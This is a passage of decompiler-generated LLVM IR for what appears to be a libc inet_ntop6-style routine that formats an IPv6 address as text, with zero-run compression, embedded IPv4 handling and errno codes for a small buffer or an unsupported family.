  %v9_8056810 = icmp eq i32 %arg1, 10
  %v1_8056813 = icmp eq i1 %v9_8056810, false
  br i1 %v1_8056813, label %dec_label_pc_80569b7, label %dec_label_pc_8056833

dec_label_pc_805681b:                             ; preds = %entry
  %v4_805681b = ptrtoint i8* %arg3 to i32
  store i32 %v4_805681b, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8056827 = call i32 @inet_ntop4(i32 %v0_8056803, i32 %v0_8056802, i32 %v0_8056801)
  store i32 %v3_8056827, i32* %eax.global-to-local, align 4
  store i32 %v3_8056827, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80569c4

dec_label_pc_8056833:                             ; preds = %dec_label_pc_8056810
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8056838 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056838, i32* %eax.global-to-local, align 4
  %tmp42 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp42, i8** %stack_var_-124, align 4
  %v6_805683d = call i32 @__GI_memset(i8* %tmp42, i32 0, i32 32)
  store i32 %v6_805683d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_805685f = add i32 %arg2, 1
  br label %dec_label_pc_8056849

dec_label_pc_8056849:                             ; preds = %dec_label_pc_8056849.dec_label_pc_8056849_crit_edge, %dec_label_pc_8056833
  %v1_805686c = phi i32 [ %v15_8056804, %dec_label_pc_8056833 ], [ %v1_805686c.pre, %dec_label_pc_8056849.dec_label_pc_8056849_crit_edge ]
  %v0_805686771 = phi i32 [ 0, %dec_label_pc_8056833 ], [ %v0_8056870.pre, %dec_label_pc_8056849.dec_label_pc_8056849_crit_edge ]
  %v1_8056852 = ashr i32 %v0_805686771, 31
  %v2_8056853 = zext i32 %v0_805686771 to i64
  %v4_8056853 = zext i32 %v1_8056852 to i64
  %v5_8056853 = mul nuw i64 %v4_8056853, 4294967296
  %v6_8056853 = or i64 %v5_8056853, %v2_8056853
  %v8_8056853 = sdiv i64 %v6_8056853, 2
  %v9_8056853 = trunc i64 %v8_8056853 to i32
  store i32 %v9_8056853, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_8056853, i32* %ebx.global-to-local, align 4
  %v2_805685b = add i32 %v0_805686771, %arg2
  %v3_805685b = inttoptr i32 %v2_805685b to i8*
  %v4_805685b = load i8, i8* %v3_805685b, align 1
  %v5_805685b = zext i8 %v4_805685b to i32
  store i32 %v5_805685b, i32* %eax.global-to-local, align 4
  %v3_805685f = add i32 %v2_805685f, %v0_805686771
  %v4_805685f = inttoptr i32 %v3_805685f to i8*
  %v5_805685f = load i8, i8* %v4_805685f, align 1
  %v6_805685f = zext i8 %v5_805685f to i32
  store i32 %v6_805685f, i32* %edx.global-to-local, align 4
  %v2_8056864 = mul nuw nsw i32 %v5_805685b, 256
  %v1_8056867 = add i32 %v0_805686771, 2
  store i32 %v1_8056867, i32* %ecx.global-to-local, align 4
  %v2_805686a = or i32 %v6_805685f, %v2_8056864
  store i32 %v2_805686a, i32* %eax.global-to-local, align 4
  %v3_805686c = mul i32 %v9_8056853, 4
  %v4_805686c = add i32 %v3_805686c, 60
  %v5_805686c = add i32 %v4_805686c, %v1_805686c
  %v6_805686c = inttoptr i32 %v5_805686c to i32*
  store i32 %v2_805686a, i32* %v6_805686c, align 4
  %v0_8056870.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8056873 = icmp sgt i32 %v0_8056870.pre, 15
  br i1 %v7_8056873, label %dec_label_pc_8056875, label %dec_label_pc_8056849.dec_label_pc_8056849_crit_edge

dec_label_pc_8056849.dec_label_pc_8056849_crit_edge: ; preds = %dec_label_pc_8056849
  %v1_805686c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056849

dec_label_pc_8056875:                             ; preds = %dec_label_pc_8056849
  %v4_8056833 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805687f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805687f

dec_label_pc_805687f:                             ; preds = %dec_label_pc_8056875, %dec_label_pc_80568ac
  %v0_80568ac70 = phi i32 [ 0, %dec_label_pc_8056875 ], [ %v1_80568ac, %dec_label_pc_80568ac ]
  %v0_805689769 = phi i32 [ -1, %dec_label_pc_8056875 ], [ %v0_80568977, %dec_label_pc_80568ac ]
  %v0_80568b768 = phi i32 [ -1, %dec_label_pc_8056875 ], [ %v0_805689c8, %dec_label_pc_80568ac ]
  %v0_80568c267 = phi i32 [ -1, %dec_label_pc_8056875 ], [ %v0_80568a712, %dec_label_pc_80568ac ]
  %v2_805687f = mul nuw nsw i32 %v0_80568ac70, 4
  %v3_805687f = add nuw nsw i32 %v2_805687f, 60
  %v4_805687f = add i32 %v3_805687f, %v0_805687f.pre
  %v5_805687f = inttoptr i32 %v4_805687f to i32*
  %v6_805687f = load i32, i32* %v5_805687f, align 4
  %v7_805687f = icmp eq i32 %v6_805687f, 0
  %v1_8056884 = icmp eq i1 %v7_805687f, false
  %v10_8056897 = icmp eq i32 %v0_805689769, -1
  br i1 %v1_8056884, label %dec_label_pc_8056897, label %dec_label_pc_8056886

dec_label_pc_8056886:                             ; preds = %dec_label_pc_805687f
  %v1_8056889 = icmp eq i1 %v10_8056897, false
  br i1 %v1_8056889, label %dec_label_pc_8056894, label %dec_label_pc_805688b

dec_label_pc_805688b:                             ; preds = %dec_label_pc_8056886
  store i32 %v0_80568ac70, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80568ac

dec_label_pc_8056894:                             ; preds = %dec_label_pc_8056886
  %v0_8056894 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056894 = add i32 %v0_8056894, 1
  store i32 %v1_8056894, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80568ac

dec_label_pc_8056897:                             ; preds = %dec_label_pc_805687f
  br i1 %v10_8056897, label %dec_label_pc_80568ac, label %dec_label_pc_805689c

dec_label_pc_805689c:                             ; preds = %dec_label_pc_8056897
  %v10_805689c = icmp eq i32 %v0_80568b768, -1
  %v0_80568a5.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80568a1 = load i32, i32* @ebp, align 4
  %v7_80568a3 = icmp sgt i32 %v0_80568a5.pre, %v1_80568a1
  %or.cond = or i1 %v10_805689c, %v7_80568a3
  br i1 %or.cond, label %dec_label_pc_80568a5, label %dec_label_pc_80568a9

dec_label_pc_80568a5:                             ; preds = %dec_label_pc_805689c
  store i32 %v0_80568a5.pre, i32* @ebp, align 4
  store i32 %v0_80568c267, i32* @edi, align 4
  br label %dec_label_pc_80568a9

dec_label_pc_80568a9:                             ; preds = %dec_label_pc_805689c, %dec_label_pc_80568a5
  %v0_805689c10 = phi i32 [ %v0_80568c267, %dec_label_pc_80568a5 ], [ %v0_80568b768, %dec_label_pc_805689c ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80568ac

dec_label_pc_80568ac:                             ; preds = %dec_label_pc_8056897, %dec_label_pc_8056894, %dec_label_pc_805688b, %dec_label_pc_80568a9
  %v0_80568a712 = phi i32 [ %v0_80568c267, %dec_label_pc_8056897 ], [ %v0_80568c267, %dec_label_pc_8056894 ], [ %v0_80568ac70, %dec_label_pc_805688b ], [ -1, %dec_label_pc_80568a9 ]
  %v0_80568977 = phi i32 [ -1, %dec_label_pc_8056897 ], [ %v0_805689769, %dec_label_pc_8056894 ], [ %v0_80568ac70, %dec_label_pc_805688b ], [ -1, %dec_label_pc_80568a9 ]
  %v0_805689c8 = phi i32 [ %v0_80568b768, %dec_label_pc_8056897 ], [ %v0_80568b768, %dec_label_pc_8056894 ], [ %v0_80568b768, %dec_label_pc_805688b ], [ %v0_805689c10, %dec_label_pc_80568a9 ]
  %v1_80568ac = add nuw nsw i32 %v0_80568ac70, 1
  store i32 %v1_80568ac, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_80568ac, 8
  br i1 %exitcond, label %dec_label_pc_80568b2, label %dec_label_pc_805687f

dec_label_pc_80568b2:                             ; preds = %dec_label_pc_80568ac
  %v10_80568b2 = icmp eq i32 %v0_80568a712, -1
  br i1 %v10_80568b2, label %dec_label_pc_80568c4, label %dec_label_pc_80568b7

dec_label_pc_80568b7:                             ; preds = %dec_label_pc_80568b2
  %v10_80568b7 = icmp eq i32 %v0_805689c8, -1
  %v0_80568c0.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_80568b7, label %dec_label_pc_80568c0, label %dec_label_pc_80568bc

dec_label_pc_80568bc:                             ; preds = %dec_label_pc_80568b7
  %v1_80568bc = load i32, i32* @ebp, align 4
  %v7_80568be = icmp sgt i32 %v0_80568c0.pre, %v1_80568bc
  br i1 %v7_80568be, label %dec_label_pc_80568c0, label %dec_label_pc_80568c4.thread

dec_label_pc_80568c4.thread:                      ; preds = %dec_label_pc_80568bc
  br label %dec_label_pc_80568c9

dec_label_pc_80568c0:                             ; preds = %dec_label_pc_80568b7, %dec_label_pc_80568bc
  store i32 %v0_80568c0.pre, i32* @ebp, align 4
  store i32 %v0_80568a712, i32* @edi, align 4
  br label %dec_label_pc_80568c4

dec_label_pc_80568c4:                             ; preds = %dec_label_pc_80568b2, %dec_label_pc_80568c0
  %v0_80568c4 = phi i32 [ %v0_805689c8, %dec_label_pc_80568b2 ], [ %v0_80568a712, %dec_label_pc_80568c0 ]
  %v10_80568c4 = icmp eq i32 %v0_80568c4, -1
  br i1 %v10_80568c4, label %dec_label_pc_80568d1, label %dec_label_pc_80568c4.dec_label_pc_80568c9_crit_edge

dec_label_pc_80568c4.dec_label_pc_80568c9_crit_edge: ; preds = %dec_label_pc_80568c4
  %v0_80568c9.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80568c9

dec_label_pc_80568c9:                             ; preds = %dec_label_pc_80568c4.dec_label_pc_80568c9_crit_edge, %dec_label_pc_80568c4.thread
  %v0_80568c9 = phi i32 [ %v1_80568bc, %dec_label_pc_80568c4.thread ], [ %v0_80568c9.pre, %dec_label_pc_80568c4.dec_label_pc_80568c9_crit_edge ]
  %v0_80568c448 = phi i32 [ %v0_805689c8, %dec_label_pc_80568c4.thread ], [ %v0_80568c4, %dec_label_pc_80568c4.dec_label_pc_80568c9_crit_edge ]
  %v1_80568c9 = add i32 %v0_80568c9, -1
  %v6_80568c9 = sub i32 0, %v0_80568c9
  %v7_80568c9 = and i32 %v0_80568c9, %v6_80568c9
  %v8_80568c9 = icmp slt i32 %v7_80568c9, 0
  %v9_80568c9 = icmp eq i32 %v1_80568c9, 0
  %v10_80568c9 = icmp slt i32 %v1_80568c9, 0
  %v3_80568cc = icmp eq i1 %v10_80568c9, %v8_80568c9
  %v4_80568cc = icmp eq i1 %v9_80568c9, false
  %v5_80568cc = and i1 %v4_80568cc, %v3_80568cc
  br i1 %v5_80568cc, label %dec_label_pc_80568d1, label %dec_label_pc_80568ce

dec_label_pc_80568ce:                             ; preds = %dec_label_pc_80568c9
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80568d1

dec_label_pc_80568d1:                             ; preds = %dec_label_pc_80568c9, %dec_label_pc_80568c4, %dec_label_pc_80568ce
  %v0_805697117 = phi i32 [ %v0_80568c448, %dec_label_pc_80568c9 ], [ -1, %dec_label_pc_80568c4 ], [ -1, %dec_label_pc_80568ce ]
  %v2_80568d1 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_80568d1, i32* @ebx, align 4
  %v3_8056953 = add i32 %v4_8056833, 64
  %v12_8056911 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805697160 = icmp eq i32 %v0_805697117, -1
  %v1_8056919 = icmp eq i1 %v12_8056911, false
  br label %dec_label_pc_80568dc

dec_label_pc_80568dc:                             ; preds = %dec_label_pc_80568d1, %dec_label_pc_8056967
  %v10_805697166 = phi i1 [ %v10_805697160, %dec_label_pc_80568d1 ], [ %v10_8056971, %dec_label_pc_8056967 ]
  %v0_80568f665 = phi i32 [ 0, %dec_label_pc_80568d1 ], [ %v1_8056967, %dec_label_pc_8056967 ]
  %v1_80568ec64 = phi i32 [ %v0_805697117, %dec_label_pc_80568d1 ], [ %v0_8056971.pre, %dec_label_pc_8056967 ]
  %v0_80568fa63 = phi i32 [ %v2_80568d1, %dec_label_pc_80568d1 ], [ %v0_80568f018, %dec_label_pc_8056967 ]
  %stack_var_-120.162 = phi i8* [ null, %dec_label_pc_80568d1 ], [ %stack_var_-120.0, %dec_label_pc_8056967 ]
  %stack_var_-116.161 = phi i32 [ 32, %dec_label_pc_80568d1 ], [ %stack_var_-116.0, %dec_label_pc_8056967 ]
  br i1 %v10_805697166, label %dec_label_pc_80568f6, label %dec_label_pc_80568e1

dec_label_pc_80568e1:                             ; preds = %dec_label_pc_80568dc
  %v12_80568e1 = icmp eq i32 %v0_80568f665, %v1_80568ec64
  %v5_80568e3 = icmp slt i32 %v0_80568f665, %v1_80568ec64
  br i1 %v5_80568e3, label %dec_label_pc_80568f6, label %dec_label_pc_80568e5

dec_label_pc_80568e5:                             ; preds = %dec_label_pc_80568e1
  %v1_80568e5 = load i32, i32* @ebp, align 4
  %v2_80568e5 = add i32 %v1_80568e5, %v1_80568ec64
  store i32 %v2_80568e5, i32* %eax.global-to-local, align 4
  %v5_80568ea = icmp slt i32 %v0_80568f665, %v2_80568e5
  br i1 %v5_80568ea, label %dec_label_pc_80568ec, label %dec_label_pc_80568f6

dec_label_pc_80568ec:                             ; preds = %dec_label_pc_80568e5
  %v1_80568ee = icmp eq i1 %v12_80568e1, false
  br i1 %v1_80568ee, label %dec_label_pc_8056967, label %dec_label_pc_80568f0

dec_label_pc_80568f0:                             ; preds = %dec_label_pc_80568ec
  %v1_80568f0 = inttoptr i32 %v0_80568fa63 to i8*
  store i8 58, i8* %v1_80568f0, align 1
  %v0_80568f3 = load i32, i32* @ebx, align 4
  %v1_80568f3 = add i32 %v0_80568f3, 1
  store i32 %v1_80568f3, i32* @ebx, align 4
  br label %dec_label_pc_8056967

dec_label_pc_80568f6:                             ; preds = %dec_label_pc_80568e5, %dec_label_pc_80568e1, %dec_label_pc_80568dc
  %v1_80568f6 = icmp eq i32 %v0_80568f665, 0
  br i1 %v1_80568f6, label %dec_label_pc_80568fe.thread, label %dec_label_pc_80568fe

dec_label_pc_80568fe.thread:                      ; preds = %dec_label_pc_80568f6
  br label %dec_label_pc_8056952

dec_label_pc_80568fe:                             ; preds = %dec_label_pc_80568f6
  %v1_80568fa = inttoptr i32 %v0_80568fa63 to i8*
  store i8 58, i8* %v1_80568fa, align 1
  %v0_80568fd = load i32, i32* @ebx, align 4
  %v1_80568fd = add i32 %v0_80568fd, 1
  store i32 %v1_80568fd, i32* @ebx, align 4
  %v0_80568fe.pre = load i32, i32* @esi, align 4
  %v9_80568fe = icmp eq i32 %v0_80568fe.pre, 6
  %v1_8056901 = icmp eq i1 %v9_80568fe, false
  br i1 %v1_8056901, label %dec_label_pc_8056952, label %dec_label_pc_8056903

dec_label_pc_8056903:                             ; preds = %dec_label_pc_80568fe
  %v0_8056903 = load i32, i32* @edi, align 4
  %v1_8056903 = icmp eq i32 %v0_8056903, 0
  %v1_8056905 = icmp eq i1 %v1_8056903, false
  br i1 %v1_8056905, label %dec_label_pc_8056952, label %dec_label_pc_8056907

dec_label_pc_8056907:                             ; preds = %dec_label_pc_8056903
  %v0_8056907 = load i32, i32* @ebp, align 4
  %v9_8056907 = icmp eq i32 %v0_8056907, 6
  br i1 %v9_8056907, label %dec_label_pc_805691b, label %dec_label_pc_805690c

dec_label_pc_805690c:                             ; preds = %dec_label_pc_8056907
  %v9_805690c = icmp eq i32 %v0_8056907, 5
  %v1_805690f = icmp eq i1 %v9_805690c, false
  br i1 %v1_805690f, label %dec_label_pc_8056952, label %dec_label_pc_8056911

dec_label_pc_8056911:                             ; preds = %dec_label_pc_805690c
  br i1 %v1_8056919, label %dec_label_pc_8056952, label %dec_label_pc_805691b

dec_label_pc_805691b:                             ; preds = %dec_label_pc_8056911, %dec_label_pc_8056907
  %v2_8056921 = sub i32 %v1_80568fd, %v2_80568d1
  store i32 %v2_8056921, i32* @esi, align 4
  %v2_805692c = sub i32 46, %v2_8056921
  store i32 %v2_805692c, i32* @ecx, align 4
  %v1_805692e = add i32 %arg2, 12
  store i32 %v1_805692e, i32* @eax, align 4
  store i32 %v1_80568fd, i32* @edx, align 4
  %v0_8056933 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056933 = ptrtoint i8* %v0_8056933 to i32
  %v3_8056933 = ptrtoint i8* %stack_var_-120.162 to i32
  %v5_8056933 = call i32 @inet_ntop4(i32 %v1_8056933, i32 %v3_8056933, i32 %stack_var_-116.161)
  store i32 %v5_8056933, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805693a = icmp eq i32 %v5_8056933, 0
  br i1 %v1_805693a, label %dec_label_pc_80569c4, label %dec_label_pc_8056942

dec_label_pc_8056942:                             ; preds = %dec_label_pc_805691b
  %v0_8056945 = load i32, i32* @ebx, align 4
  %v5_8056945 = inttoptr i32 %v0_8056945 to i8*
  store i8* %v5_8056945, i8** %stack_var_-124, align 4
  %v3_8056946 = call i32 @strlen(i8* %v5_8056945)
  store i32 %v3_8056946, i32* %eax.global-to-local, align 4
  %v0_805694e = load i32, i32* @ebx, align 4
  %v3_805694e = add i32 %v0_805694e, %v3_8056946
  store i32 %v3_805694e, i32* @ebx, align 4
  %v0_8056976.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056976

dec_label_pc_8056952:                             ; preds = %dec_label_pc_80568fe.thread, %dec_label_pc_8056911, %dec_label_pc_805690c, %dec_label_pc_8056903, %dec_label_pc_80568fe
  %v1_805695353 = phi i32 [ 0, %dec_label_pc_80568fe.thread ], [ %v0_80568fe.pre, %dec_label_pc_8056911 ], [ %v0_80568fe.pre, %dec_label_pc_805690c ], [ %v0_80568fe.pre, %dec_label_pc_8056903 ], [ %v0_80568fe.pre, %dec_label_pc_80568fe ]
  %v0_805695c52 = phi i32 [ %v0_80568fa63, %dec_label_pc_80568fe.thread ], [ %v1_80568fd, %dec_label_pc_8056911 ], [ %v1_80568fd, %dec_label_pc_805690c ], [ %v1_80568fd, %dec_label_pc_8056903 ], [ %v1_80568fd, %dec_label_pc_80568fe ]
  %v0_8056952 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8056952, i32* %stack_var_-112, align 4
  %v2_8056953 = mul i32 %v1_805695353, 4
  %v4_8056953 = add i32 %v3_8056953, %v2_8056953
  %v5_8056953 = inttoptr i32 %v4_8056953 to i32*
  %v6_8056953 = load i32, i32* %v5_8056953, align 4
  %v5_805695c = inttoptr i32 %v0_805695c52 to i8*
  store i8* %v5_805695c, i8** %stack_var_-124, align 4
  %v6_805695d = call i32 @sprintf(i32 %v0_805695c52, i32 ptrtoint ([3 x i8]* @global_var_805a5f1.566 to i32), i32 %v6_8056953, i32 %v0_8056952)
  store i32 %v6_805695d, i32* %eax.global-to-local, align 4
  %v0_8056965 = load i32, i32* @ebx, align 4
  %v2_8056965 = add i32 %v0_8056965, %v6_805695d
  store i32 %v2_8056965, i32* @ebx, align 4
  br label %dec_label_pc_8056967

dec_label_pc_8056967:                             ; preds = %dec_label_pc_80568ec, %dec_label_pc_80568f0, %dec_label_pc_8056952
  %stack_var_-116.0 = phi i32 [ %v6_8056953, %dec_label_pc_8056952 ], [ %stack_var_-116.161, %dec_label_pc_80568ec ], [ %stack_var_-116.161, %dec_label_pc_80568f0 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a5f1.566, i32 0, i32 0), %dec_label_pc_8056952 ], [ %stack_var_-120.162, %dec_label_pc_80568ec ], [ %stack_var_-120.162, %dec_label_pc_80568f0 ]
  %v0_80568f018 = phi i32 [ %v2_8056965, %dec_label_pc_8056952 ], [ %v0_80568fa63, %dec_label_pc_80568ec ], [ %v1_80568f3, %dec_label_pc_80568f0 ]
  %v0_8056967 = load i32, i32* @esi, align 4
  %v1_8056967 = add i32 %v0_8056967, 1
  %v0_8056971.pre = load i32, i32* @edi, align 4
  store i32 %v1_8056967, i32* @esi, align 4
  %v7_805696b = icmp sgt i32 %v1_8056967, 7
  %v10_8056971 = icmp eq i32 %v0_8056971.pre, -1
  br i1 %v7_805696b, label %dec_label_pc_8056971, label %dec_label_pc_80568dc

dec_label_pc_8056971:                             ; preds = %dec_label_pc_8056967
  br i1 %v10_8056971, label %dec_label_pc_8056982, label %dec_label_pc_8056976

dec_label_pc_8056976:                             ; preds = %dec_label_pc_8056971, %dec_label_pc_8056942
  %v0_805697e = phi i32 [ %v0_80568f018, %dec_label_pc_8056971 ], [ %v3_805694e, %dec_label_pc_8056942 ]
  %v0_8056976 = phi i32 [ %v0_8056971.pre, %dec_label_pc_8056971 ], [ %v0_8056976.pre, %dec_label_pc_8056942 ]
  %v1_8056976 = load i32, i32* @ebp, align 4
  %v2_8056976 = add i32 %v1_8056976, %v0_8056976
  store i32 %v2_8056976, i32* %eax.global-to-local, align 4
  %v9_8056979 = icmp eq i32 %v2_8056976, 8
  %v1_805697c = icmp eq i1 %v9_8056979, false
  br i1 %v1_805697c, label %dec_label_pc_8056982, label %dec_label_pc_805697e

dec_label_pc_805697e:                             ; preds = %dec_label_pc_8056976
  %v1_805697e = inttoptr i32 %v0_805697e to i8*
  store i8 58, i8* %v1_805697e, align 1
  %v0_8056981 = load i32, i32* @ebx, align 4
  %v1_8056981 = add i32 %v0_8056981, 1
  store i32 %v1_8056981, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056982

dec_label_pc_8056982:                             ; preds = %dec_label_pc_8056976, %dec_label_pc_8056971, %dec_label_pc_805697e
  %v0_8056986 = phi i32 [ %v0_805697e, %dec_label_pc_8056976 ], [ %v0_80568f018, %dec_label_pc_8056971 ], [ %v1_8056981, %dec_label_pc_805697e ]
  store i32 %v2_80568d1, i32* %edx.global-to-local, align 4
  %v1_8056986 = add i32 %v0_8056986, 1
  store i32 %v1_8056986, i32* %eax.global-to-local, align 4
  %v1_8056989 = inttoptr i32 %v0_8056986 to i8*
  store i8 0, i8* %v1_8056989, align 1
  %v0_805698c = load i32, i32* %eax.global-to-local, align 4
  %v1_805698c = load i32, i32* %edx.global-to-local, align 4
  %v2_805698c = sub i32 %v0_805698c, %v1_805698c
  store i32 %v2_805698c, i32* @eax, align 4
  %tmp77 = icmp ugt i32 %v2_805698c, %arg4
  br i1 %tmp77, label %dec_label_pc_8056994, label %dec_label_pc_80569a1

dec_label_pc_8056994:                             ; preds = %dec_label_pc_8056982
  %v0_8056994 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056994 = ptrtoint i8* %v0_8056994 to i32
  %v2_8056994 = call i32 @__errno_location(i32 %v1_8056994)
  store i32 %v2_8056994, i32* %eax.global-to-local, align 4
  %v1_8056999 = inttoptr i32 %v2_8056994 to i32*
  store i32 28, i32* %v1_8056999, align 4
  br label %dec_label_pc_80569c2

dec_label_pc_80569a1:                             ; preds = %dec_label_pc_8056982
  %v0_80569a1 = load i32, i32* @edi, align 4
  store i32 %v0_80569a1, i32* %stack_var_-112, align 4
  %tmp44 = bitcast i8** %stack_var_12 to i32*
  %v3_80569a41 = load i32, i32* %tmp44, align 4
  %tmp45 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80569a41, i32* %tmp45, align 4
  %v0_80569ab.cast = inttoptr i32 %v3_80569a41 to i8*
  %v5_80569ab = call i32 @strcpy(i8* %v0_80569ab.cast, i32 %v2_80568d1)
  store i32 %v5_80569ab, i32* %eax.global-to-local, align 4
  store i32 %v5_80569ab, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80569c4

dec_label_pc_80569b7:                             ; preds = %dec_label_pc_8056810
  %v1_80569b7 = call i32 @__errno_location(i32 %v0_8056803)
  store i32 %v1_80569b7, i32* %eax.global-to-local, align 4
  %v1_80569bc = inttoptr i32 %v1_80569b7 to i32*
  store i32 97, i32* %v1_80569bc, align 4
  br label %dec_label_pc_80569c2

dec_label_pc_80569c2:                             ; preds = %dec_label_pc_8056994, %dec_label_pc_80569b7
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80569c4

dec_label_pc_80569c4:                             ; preds = %dec_label_pc_805691b, %dec_label_pc_80569a1, %dec_label_pc_805681b, %dec_label_pc_80569c2
  %v0_80569c7 = phi i32 [ 0, %dec_label_pc_805691b ], [ %v5_80569ab, %dec_label_pc_80569a1 ], [ %v3_8056827, %dec_label_pc_805681b ], [ 0, %dec_label_pc_80569c2 ]
  store i32 %v0_80569c7, i32* %eax.global-to-local, align 4
  store i32 %v0_8056803, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80569c7

; uselistorder directives
  uselistorder i32 %v0_80569c7, { 1, 0 }
  uselistorder i32 %v0_8056986, { 1, 0 }
  uselistorder i32 %v1_8056967, { 1, 0, 2 }
  uselistorder i32 %v0_805695c52, { 1, 0 }
  uselistorder i32 %v0_80568fe.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_80568fd, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.161, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.162, { 2, 1, 0 }
  uselistorder i32 %v0_80568fa63, { 2, 3, 1, 0 }
  uselistorder i32 %v1_80568ec64, { 2, 0, 1 }
  uselistorder i32 %v0_80568f665, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80568d1, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80568c9, { 1, 0 }
  uselistorder i32 %v0_80568c9, { 1, 2, 0 }
  uselistorder i32 %v1_80568ac, { 0, 2, 1 }
  uselistorder i32 %v0_805689c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80568a712, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8056897, { 1, 0 }
  uselistorder i32 %v0_80568c267, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80568b768, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80568ac70, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805686771, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8056803, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 6, 4, 2, 5, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_805a5f1.566, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 1, 0, 3, 4, 2 }
  uselistorder i32 64, { 7, 3, 0, 6, 8, 5, 2, 4, 1 }
  uselistorder i32* @esp, { 0, 1, 73, 74, 75, 76, 77, 78, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 15, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 11, 272, 273, 274, 12, 275, 9, 276, 277, 278, 279, 280, 281, 13, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 10, 295, 296, 297, 298, 299, 300, 14, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 172, 2, 3, 329, 4, 5, 6, 16, 173, 174, 175, 176, 17, 177, 178, 179, 180, 181, 19, 182, 183, 184, 21, 185, 22, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 20, 198, 23, 199, 200, 201, 24, 202, 203, 204, 205, 206, 207, 208, 209, 18, 210, 109, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 92, 8, 89, 90, 91, 93, 94, 95, 96, 97, 25, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 112, 113, 114, 7, 115, 116, 117, 118, 122, 119, 120, 121, 123, 124, 126, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 138, 140, 141, 142, 143, 144, 145, 26, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 27, 156, 157, 158, 159, 28, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 29, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 30, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 31, 67, 68, 69, 70, 71, 72, 250, 322, 323, 324, 325, 326, 327, 328 }
  uselistorder i32 15, { 1, 4, 10, 9, 2, 8, 3, 5, 6, 7, 0 }
  uselistorder i32 60, { 5, 6, 3, 7, 8, 4, 1, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15 }
